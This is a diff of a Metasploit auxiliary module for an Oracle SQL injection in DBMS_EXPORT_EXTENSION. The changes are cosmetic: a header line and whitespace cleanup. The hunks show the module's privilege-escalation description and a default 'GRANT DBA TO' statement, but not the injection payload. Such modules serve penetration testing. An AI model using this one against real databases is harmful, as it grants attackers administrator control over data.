@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -15,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'SQL Injection via DBMS_EXPORT_EXTENSION.',
 			'Description'    => %q{
-				This module will escalate a Oracle DB user to DBA by exploiting an 
+				This module will escalate a Oracle DB user to DBA by exploiting an
 				sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
 
 				Note: This module has been tested against 9i, 10gR1 and 10gR2.
@@ -32,15 +36,15 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Apr 26 2006'))
 
-			register_options( 
+			register_options(
 				[
-					OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),					
+					OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
 				], self.class)
 	end
 
 	def run
 		return if not check_dependencies
-	
+
 		name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
